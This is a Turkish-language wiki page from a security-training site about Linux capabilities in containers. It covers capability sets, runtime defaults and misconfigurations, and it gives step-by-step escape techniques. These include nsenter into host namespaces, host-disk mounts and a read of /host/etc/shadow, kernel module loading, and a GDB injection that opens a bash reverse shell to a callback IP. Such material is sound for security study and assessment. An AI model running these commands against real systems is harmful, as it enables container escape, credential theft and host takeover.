# Container'larda Linux Capabilities

{{#include ../../../../banners/hacktricks-training.md}}

## Genel Bakış

Linux capabilities, container güvenliğinin en önemli bileşenlerinden biridir; çünkü ince ama temel bir soruya yanıt verirler: **Bir container içinde "root" olmak gerçekte ne anlama gelir?** Normal bir Linux sisteminde UID 0, tarihsel olarak çok geniş bir ayrıcalık kümesi anlamına geliyordu. Modern kernel'lerde bu ayrıcalık, capability adı verilen daha küçük birimlere ayrılmıştır. İlgili capabilities kaldırılmışsa bir süreç root olarak çalışsa bile birçok güçlü işlemi gerçekleştiremeyebilir. <sup>[[1]](#references)</sup>

Container'lar bu ayrıma büyük ölçüde dayanır. Uyumluluk veya basitlik nedeniyle birçok workload hâlâ container içinde UID 0 olarak başlatılır. Capabilities kaldırılmadığında bu son derece tehlikeli olurdu. Capabilities kaldırıldığında ise container içindeki root süreç, daha hassas kernel işlemlerinden mahrum bırakılırken container içinde birçok sıradan görevi gerçekleştirebilir. Bu nedenle `uid=0(root)` yazan bir container shell'i, otomatik olarak "host root" ya da geniş kernel ayrıcalıkları anlamına gelmez. Bu root kimliğinin gerçekte ne kadar yetkili olduğunu capability kümeleri belirler.

Linux capabilities'in kapsamlı referansı ve birçok kötüye kullanım örneği için bkz.:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Çalışma

Capabilities; permitted, effective, inheritable, ambient ve bounding kümeleri dahil olmak üzere çeşitli kümelerde izlenir. Birçok container değerlendirmesinde, her kümenin kernel düzeyindeki kesin anlamından daha önemli olan pratik soru şudur: **Bu süreç şu anda hangi ayrıcalıklı işlemleri başarıyla gerçekleştirebilir ve gelecekte hangi ayrıcalıkları hâlâ edinebilir?** <sup>[[1]](#references)</sup>

Bunun önemli olmasının nedeni, birçok breakout tekniğinin aslında container sorunları gibi görünen capability sorunları olmasıdır. `CAP_SYS_ADMIN` yetkisine sahip bir workload, normal bir container root sürecinin dokunmaması gereken çok sayıda kernel işlevine erişebilir. `CAP_NET_ADMIN` yetkisine sahip bir workload, host ağ namespace'ini de paylaşıyorsa çok daha tehlikeli hâle gelir. `CAP_SYS_PTRACE` yetkisine sahip bir workload ise host PID paylaşımı sayesinde host süreçlerini görebiliyorsa çok daha ilgi çekici olur. Docker veya Podman'da bu, `--pid=host` şeklinde görünebilir; Kubernetes'te ise genellikle `hostPID: true` olarak ifade edilir.

Başka bir deyişle, capability kümesi tek başına değerlendirilemez. Namespace'ler, seccomp ve MAC policy ile birlikte incelenmelidir.

## Lab

Bir container içindeki capabilities'i incelemenin doğrudan bir yolu şudur:

```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```

Tüm capabilities eklenmiş bir container'ı daha kısıtlayıcı olanla da karşılaştırabilirsiniz:

```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

Dar kapsamlı bir eklemenin etkisini görmek için her şeyi kaldırıp yalnızca tek bir capability'yi yeniden eklemeyi deneyin:

```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

Bu küçük deneyler, bir runtime'ın yalnızca "privileged" adlı bir boolean'ı açıp kapatmadığını göstermeye yardımcı olur. Runtime, süreç için kullanılabilir gerçek ayrıcalık yüzeyini şekillendirir.

## Yüksek Riskli Capabilities

Capabilities, yalnızca işlemleri **host tarafından yönetilen bir kaynağa** eriştiğinde escape araçlarına dönüşür. Tekrarlayan yüksek riskli kombinasyonlar şunlardır:

- **`CAP_SYS_ADMIN`** ile birlikte bir host PID, block device veya yazılabilir kernel-control yolu. Hedef mount namespace'e katılmak ayrıca `CAP_SYS_CHROOT` gerektirir; block tabanlı bir filesystem'i mount etmek ise initial user namespace içinde `CAP_SYS_ADMIN` gerektirir.
- **`CAP_SYS_PTRACE`** ile birlikte host PID görünürlüğü ve attach edilebilir bir host süreci. Ptrace injection için `CAP_SYS_ADMIN` gerekmez.
- **`CAP_DAC_OVERRIDE` veya `CAP_DAC_READ_SEARCH`** ile birlikte erişilebilir bir host filesystem'i. Bu capabilities farklı DAC denetimlerini atlar, ancak host filesystem görünümü oluşturmaz.
- Initial user namespace içindeki **`CAP_SYS_MODULE`** ile birlikte kabul edilen, kernel ile uyumlu bir module. Sıradan Linux container'ları node kernel'ini paylaşır; VM veya userspace-kernel runtime'ları bu sınırı değiştirir.
- Initial user namespace içindeki **`CAP_MKNOD`** ile birlikte device cgroup'un zaten izin verdiği gerçek bir host device. Bir node oluşturmak device cgroup'u atlamaz.
- Açığa çıkarılmış ve kullanılabilir bir memory, I/O-port, PCI veya device-control arayüzüyle birlikte **`CAP_SYS_RAWIO`**.
- Host'u yeniden başlatmak için initial PID namespace ile birlikte **`CAP_SYS_BOOT`** veya kernel'i değiştirmek için kullanılabilir ve izin verilen bir kexec yolu.
- Node ağ durumunu doğrudan kontrol etmek için host network namespace içindeki **`CAP_NET_ADMIN`**. **`CAP_NET_RAW`** protokole özgü bir escape'e katkıda bulunabilir, ancak tek başına raw socket'ler node üzerinde shell sağlamaz.

`CAP_SYS_CHROOT`, bilerek tek başına bir escape capability'si olarak listelenmemiştir. Mount namespace `setns()` işlemi için gerekebilir ve zaten erişilebilir bir host ağacını kullanmayı kolaylaştırabilir; ancak tek başına `chroot()` bu ağacı açığa çıkarmaz veya yeni filesystem izinleri vermez. Benzer şekilde, **`CAP_BPF`** ve **`CAP_PERFMON`** güçlü telemetry ve kernel saldırı yüzeyini açığa çıkarır; ancak ayrı bir kernel açığı olmadığında, bu capabilities'in olağan işlemleri genel amaçlı container escape'leri sağlamaz.

## Runtime Kullanımı

Docker, Podman, containerd tabanlı stack'ler ve CRI-O, capability kontrollerini kullanır; ancak varsayılan ayarlar ve yönetim arayüzleri farklıdır. Docker, bunları `--cap-drop` ve `--cap-add` gibi flag'lerle doğrudan sunar. Podman benzer kontroller sunar ve ek bir güvenlik katmanı olarak bunları genellikle rootless çalıştırmayla birleştirir. Kubernetes, capability ekleme ve çıkarmayı Pod veya container `securityContext` üzerinden sunar; daha düşük seviyeli runtime'lar ise ortaya çıkan set'leri OCI runtime yapılandırmasında belirtir. LXC ve Incus gibi system-container ortamları da capability kontrolüne dayanır; ancak host'la daha kapsamlı entegrasyonları, operatörleri varsayılanları bir application container için gevşeteceklerinden daha fazla gevşetmeye yöneltebilir. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

Aynı ilke hepsi için geçerlidir: teknik olarak verilebilen bir capability'nin verilmesi mutlaka doğru değildir. Gerçek dünyadaki birçok olay, bir workload daha kısıtlı bir yapılandırmada çalışmadığı ve ekibin hızlı bir çözüme ihtiyaç duyduğu için operatörün bir capability eklemesiyle başlar.

## Yanlış Yapılandırmalar

En belirgin hata, Docker/Podman tarzı CLI'larda **`--cap-add=ALL`** kullanmaktır; ancak tek hata bu değildir. Uygulamada daha yaygın sorun, özellikle `CAP_SYS_ADMIN` gibi bir veya iki son derece güçlü capability'nin, namespace, seccomp ve mount etkileri anlaşılmadan "uygulamayı çalıştırmak" için verilmesidir. Bir diğer yaygın hata, ek capabilities'i host namespace paylaşımıyla birleştirmektir. Docker veya Podman'da bu, `--pid=host`, `--network=host` ya da `--userns=host` biçiminde görülebilir; Kubernetes'te eşdeğer maruziyet genellikle `hostPID: true` veya `hostNetwork: true` gibi workload ayarlarıyla ortaya çıkar. Bu kombinasyonların her biri, capability'nin gerçekte neleri etkileyebileceğini değiştirir.

Ayrıca, workload tamamen `--privileged` olmadığından hâlâ anlamlı ölçüde kısıtlandığına inanan yöneticilere de sık rastlanır. Bu bazen doğrudur; ancak bazen etkili güvenlik durumu zaten privileged olmaya yeterince yakındır ve bu ayrım operasyonel açıdan önemini yitirir.

## Kötüye Kullanım

Etkili set'leri, user namespace eşlemesini, seccomp durumunu, namespace'leri, mount'ları ve device'ları kaydederek başlayın. Bu bağlam olmadan bir capability adı, escape gerçekleşebileceğini kanıtlamaz:

```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```

### `CAP_SYS_ADMIN`: namespaces ve block devices

Host PID görünürlüğüyle `CAP_SYS_ADMIN`, host namespaces'lerine girebilir. Mount namespace işlemi, çağıranın user namespace'inde `CAP_SYS_CHROOT` da gerektirir.

**Capability ve confinement'ı kontrol edin:**

```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```

**Hedefi listeleyin:** container/Pod yapılandırmasından veya açıkça host'a ait bir process listesinden host PID paylaşımını doğrulayın, ardından hedef namespace'leri inceleyin. Private PID namespace'lerinde de yerel bir PID 1 bulunur; dolayısıyla tek başına varlığı, host PID paylaşımını kanıtlamaz.

```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```

**Namespace yolunu exploit edin:**

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```

Capability kontrolleri, hedeflere sahip olan user namespace’lerde başarılı olmalıdır. `--pid=host` veya Kubernetes’te `hostPID: true` görünürlük sağlar; capabilities sağlamaz.

Alternatif blok aygıtı yolunda adayları **enumerate** edin, ardından doğrulanmış adayı önce salt okunur bağlayarak erişilebilir dosya sistemini **exploit** edin:

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```

Aygıt düğümü mevcut olmalı, device cgroup buna izin vermeli ve blok dosya sistemi mount'ları için ilk user namespace'te `CAP_SYS_ADMIN` gerekir. `/host` konumuna zaten bind edilmiş bir host root, `CAP_SYS_ADMIN` **olmadan** host erişimi sağlar; `chroot /host` yalnızca kolaylık sağlar ve ayrıca `CAP_SYS_CHROOT` gerektirir.

### Erişilebilir host root: doğrudan dosya sistemi yürütme

Host root zaten `/host` konumuna mount edilmişse önce mount'u doğrulayın, ardından mevcut erişimi doğrudan kullanın. Bu yöntem `CAP_SYS_ADMIN` yetkisine bağlı değildir:

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```

`chroot()` kullanılamıyorsa ancak ana makine ikilisi container'ın mimarisi ve yükleyicisiyle uyumluysa, genellikle bağlanmış ağaç üzerinden çağrılabilir:

```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```

`/host` altındaki doğrudan okuma ve yazma işlemleri zaten host dosya sisteminin ele geçirilmesi anlamına gelir. `chroot()` kullanmak veya bir host binary’si çalıştırmak bu erişimi yalnızca daha kolay hâle getirir; bu işlemlerin hiçbiri host mount’unu oluşturmaz veya salt okunur bir mount’u ya da MAC politikasını aşmaz.

### `CAP_SYS_PTRACE`: host-process injection

Host PID’lerini görebilme ve hedefin user namespace’inde `CAP_SYS_PTRACE` yetkisiyle GDB, izin verilen bir host sürecine `system()` çağrısı yaptırabilir. `CAP_SYS_ADMIN` gerekmez.

**Yeteneği ve bağlanma denetimlerini kontrol edin:**

```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```

**Atılabilir bir hedef belirleyip seçin:** yapılandırmadan veya açıkça anlaşılır bir node süreç listesinden host PID paylaşımını doğrulayın; PID 1'i veya kritik bir daemon'ı asla seçmeyin.

```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
  "/proc/${target_pid}/status"
```

**Seçilen process'i exploit et:**

```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
  -ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
  -ex detach
```

Hedefe attach edilebilmeli ve kullanılabilir bir `system()` sembolü ile Bash payload path’i bulunmalıdır. Yama, dump edilemeyen durum, seccomp, user namespace’ler ve MAC policy zinciri engelleyebilir. GDB, attach edildiğinde hedefi durdurur; bu nedenle yalnızca atılabilir bir lab process’i kullanın.

### `CAP_DAC_OVERRIDE` ve `CAP_DAC_READ_SEARCH`: korumalı host dosyaları

Bu capabilities host filesystem’ı açığa çıkarmaz. `/host` zaten bir host mount ise `CAP_DAC_READ_SEARCH` okuma/arama DAC kontrollerini, `CAP_DAC_OVERRIDE` ise ek olarak sıradan yazma kontrollerini aşabilir:

**Capabilities’i kontrol edin:**

```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**Açığa çıkan ana bilgisayar dosya sistemini ve hedef izinleri numaralandırın:**

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
  /host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```

**Geçici bir laboratuvar ortamında okuma ve yazma bypass'larını deneyin**:

```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```

Salt okunur bir mount ve LSM kuralları geçerliliğini korur. `CAP_DAC_READ_SEARCH`, `open_by_handle_at()` kullanımına da izin verir; ancak Shocker gibi bir breakout için aynı temel dosya sistemine ait bir mount file descriptor, geçerli veya keşfedilebilir handle'lar, uyumlu bir dosya sistemi/depolama düzeni ve runtime ya da LSM engelinin bulunmaması da gerekir. Bu capability, mount namespace dışındaki her dosya sistemine keyfi erişim sağlamaz.

### `CAP_SYS_MODULE`: paylaşılan çekirdekte kod yürütme

Sıradan bir Linux container'da kabul edilen bir modül, paylaşılan host kernel'de çalışır.

**Capability'yi ve user namespace kapsamını kontrol edin:**

```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Modül yükleme ön koşullarını sıralayın:**

```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
  "/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```

**Yalnızca uyumlu, önceden incelenmiş bir proof module ile elden çıkarılabilir bir node üzerinde exploit edin:**

```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```

Capability, başlangıç user namespace'inde etkin olmalıdır. Kernel sürümü ve yapılandırması, modül imzaları, lockdown, seccomp ve LSM policy yüklemeye izin vermelidir. Kata, gVisor, Hyper-V isolation ve benzer runtime'lar, workload'un hangi kernel sınırına ulaştığını değiştirir.

### `CAP_MKNOD`: izin verilen bir cihaz tanıtıcısı oluşturma

`CAP_MKNOD` bir cihaz düğümü oluşturur ancak device cgroup'u bypass etmez. Cihaz oluşturma namespaced değildir; bu nedenle capability, başlangıç user namespace'inde etkin olmalıdır.

**Capability'yi ve user namespace kapsamını kontrol edin:**

```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Gerçek aygıtları, major/minor numaralarını ve görünür cgroup-v1 izin listesini listeleyin:**

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
  printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```

**Doğrulanmış bir ext-family adayını salt okunur şekilde exploit et:**

```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

Diğer dosya sistemleri için eşleşen bir salt okunur araç gerekir; aygıtı mount etmek ayrıca `CAP_SYS_ADMIN` gerektirir. Oluşturulan düğümü açarken alınan `Operation not permitted` hatası genellikle aygıt cgroup'unun erişimi hâlâ engellediğini gösterir. cgroup v2 altında aygıt erişimi genellikle BPF ile uygulanır ve `devices.list` dosyası bulunmaz; bu nedenle başarılı bir açma işlemi belirleyici testtir.

### `CAP_SYS_RAWIO`: açığa çıkarılan raw-I/O arayüzü

Taşınabilir, genel amaçlı bir payload yoktur: geçerli adresler ve etkiler donanıma ve kernel yapılandırmasına bağlıdır.

**Capability'yi ve user namespace kapsamını kontrol edin:**

```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Açığa çıkarılmış ham arayüzleri, donanımları ve sürücüleri listeleyin:**

```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

**Yalnızca tanımlanan cihaz ve adres aralığı için onaylanmış bir kanıt kullanarak exploit gerçekleştirin.** `/dev/mem` laboratuvarda onaylanmış arayüzse bu şablon, içeriğini yazdırmadan düğüm belleğinin ifşa edildiğini kanıtlar:

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

Adres, laboratuvarın donanım haritasından alınmalıdır; çünkü bazı MMIO bölgelerini okumak yan etkilere yol açabilir. Genel amaçlı bir bellek yazma komutu yanıltıcı ve güvensiz olur: aynı adres bir makinede zararsızken başka bir makinede donanımı veya kernel belleğini kontrol edebilir. Device cgroups, dosya sistemi izinleri, katı `/dev/mem` kısıtlamaları, kernel lockdown, sanallaştırma ve LSM politikaları genellikle kullanışlı erişimi engeller.

### `CAP_SYS_BOOT`: namespace'i yeniden başlatma veya kernel değiştirme

Özel bir PID namespace içinde `reboot()`, host'u yeniden başlatmak yerine o namespace'in init sürecini sonlandırır. Bu nedenle host'u yeniden başlatmak için başlangıç PID namespace'inde olmak gerekir; bu da normalde host PID paylaşımını gerektirir. Bir kexec yolu ayrıca uyumlu bir kernel imajı ile izin verici bir lockdown/imza politikası gerektirir:

**Capability'yi kontrol et:**

```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**PID-namespace ve kexec ön koşullarını listeleyin:** tek başına bir PID namespace bağlantısı bunun düğümün başlangıç namespace’i olup olmadığını göstermediğinden, iş yükü yapılandırmasından host PID paylaşımını doğrulayın.

```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

**Yalnızca geçici bir laboratuvar düğümünü yeniden başlatmanın açıkça alıştırma olarak belirtildiği durumlarda exploit edin:**

```bash
sync
reboot -f
```

Bu capability'yi kanıtlamak için paylaşılan bir düğümde bu komutu çalıştırmayın veya kernel yüklemeyin. Özel bir PID namespace içinde bu işlem yalnızca o namespace'in init process'ini sonlandırır ve host üzerindeki etkiyi göstermez.

### `CAP_NET_ADMIN` ve `CAP_NET_RAW`: host ağ yolları

`CAP_NET_ADMIN` yalnızca geçerli network namespace'i etkiler.

**Capabilities ve kısıtlamaları kontrol edin:**

```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**Mevcut ağı listeleyin ve host networking'i iş yükü yapılandırmasından doğrulayın:**

```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```

**`CAP_NET_ADMIN` yetkisini geri alınabilir şekilde kullanın:** host networking ile geçici arayüz bir node arayüzüdür.

```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```

`CAP_NET_RAW`, RAW ve PACKET soketlerine izin verir ancak genel amaçlı bir host shell değildir. Belgelenmiş GCE zincirini **listelemek** için metadata rotasını kontrol edin ve düz metin guest-agent trafiğinin gözlemlenebilir olup olmadığını yakalayın:

```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```

Eşleşen ön koşullar mevcutsa, [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html) belgesinde açıklandığı şekilde ortama özgü zinciri **exploit** edin: isteği ve sıralama durumunu yakalayın, SSH key içeren sahte metadata yanıtını enjekte edin, ardından host erişimini doğrulayın. Bu zincir root, host networking, `CAP_NET_ADMIN`, `CAP_NET_RAW`, şifrelenmemiş GCE metadata trafiği ve yarış koşuluna açık bir guest-agent isteği gerektirir; modern taşıma veya agent davranışı zincirin işlemesini engelleyebilir.

### Yerel kaynak kısıtlamaları ve arayüz adresleri

Bir listener, kaynağı `127.0.0.1` olan bağlantıları reddedip aynı network namespace'e atanmış başka bir adresi gözden kaçırabilir. Listener'a bu arayüz üzerinden erişilebiliyorsa, loopback bağlantısını mevcut, loopback olmayan yerel bir adrese bağlanmış bağlantıyla karşılaştırın. `CAP_NET_ADMIN`, mevcut namespace'te arayüz yapılandırılmasına izin verebilir; ancak uygun bir adres zaten atanmışsa gerekli değildir. Sıradan bir TCP bağlantısı için `CAP_NET_RAW` gerekmez. Bu, kaynak adresi sınıflandırmasındaki bir hatadır; container escape değildir ve uygulamanın ayrıcalıklı bir isteği yetkilendireceğini kanıtlamaz.<sup>[[1]](#references)[[7]](#references)</sup>

Bir WebSocket listener için geçerli bir HTTP `101 Switching Protocols` yanıtı, açılış el sıkışmasının tamamlandığını gösterir; sonrasında gelen uygulama düzeyindeki bir hata, bağlantının handler'a ulaştığını gösterebilir. Bu yanıtların hiçbiri kimlik doğrulamanın veya istenen işlemin başarılı olduğunu kanıtlamaz.<sup>[[8]](#references)</sup>

## Kontroller

Capability kontrollerinin amacı yalnızca ham değerleri dökmek değil, sürecin mevcut namespace ve mount durumunu tehlikeli hâle getirecek kadar ayrıcalığa sahip olup olmadığını anlamaktır.

```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```

Burada ilginç olanlar:

- `capsh --print`, `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` veya `cap_sys_module` gibi yüksek riskli capabilities değerlerini tespit etmenin en kolay yoludur.
- `/proc/self/status` içindeki `CapEff` satırı, diğer kümelerde nelerin kullanılabilir olabileceğini değil, şu anda gerçekten etkin olanları gösterir.
- Container ayrıca host PID, network veya user namespaces paylaşıyorsa ya da yazılabilir host mount'larına sahipse, capability dökümü çok daha önemli hale gelir.

Ham capability bilgilerini topladıktan sonraki adım, bunları yorumlamaktır. Process'in root olup olmadığını, user namespaces'in etkin olup olmadığını, host namespaces'in paylaşılıp paylaşılmadığını, seccomp'un uygulamaları zorunlu kılıp kılmadığını ve AppArmor veya SELinux'un process'i hâlâ kısıtlayıp kısıtlamadığını sorgulayın. Capability kümesi tek başına hikâyenin yalnızca bir parçasıdır; ancak çoğu zaman aynı başlangıç noktasına sahip bir container breakout girişiminin neden başarılı olduğunu, diğerinin ise neden başarısız olduğunu açıklar.

## Runtime Varsayılanları

| Runtime / platform | Varsayılan durum | Varsayılan davranış | Yaygın manuel zayıflatma |
| --- | --- | --- | --- |
| Docker Engine | Varsayılan olarak azaltılmış capability kümesi | Docker, varsayılan bir capability izin listesi tutar ve geri kalanları düşürür | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Varsayılan olarak azaltılmış capability kümesi | Podman container'ları varsayılan olarak ayrıcalıksızdır ve azaltılmış bir capability modeli kullanır | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Değiştirilmediği sürece runtime varsayılanlarını devralır | `securityContext.capabilities` belirtilmezse container, runtime'dan varsayılan capability kümesini alır | `securityContext.capabilities.add`, `drop: [\"ALL\"]` ayarlamamak, `privileged: true` |
| Kubernetes altında containerd / CRI-O | Genellikle runtime varsayılanı | Etkin küme, runtime'a ve Pod spec'ine bağlıdır | Kubernetes satırındakiyle aynı; doğrudan OCI/CRI yapılandırması da açıkça capabilities ekleyebilir |

Kubernetes için önemli nokta, API'nin evrensel bir varsayılan capability kümesi tanımlamamasıdır. Pod capabilities eklemez veya düşürmezse, workload o node için runtime varsayılanını devralır.

{{#include ../../../../banners/hacktricks-training.md}}

## References

- [1] [capabilities(7) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - Linux container yapılandırması](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Docker Docs - Runtime ayrıcalıkları ve Linux capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Kubernetes Documentation - Bir container için capabilities ayarlama](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Podman documentation - `--cap-add` ve `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Incus documentation - Güvenlik](https://linuxcontainers.org/incus/docs/main/explanation/security/)
- [7] [ip(7) - Linux IPv4 protocol uygulaması](https://man7.org/linux/man-pages/man7/ip.7.html)
- [8] [RFC 6455 - WebSocket Protocol](https://www.rfc-editor.org/rfc/rfc6455.html)
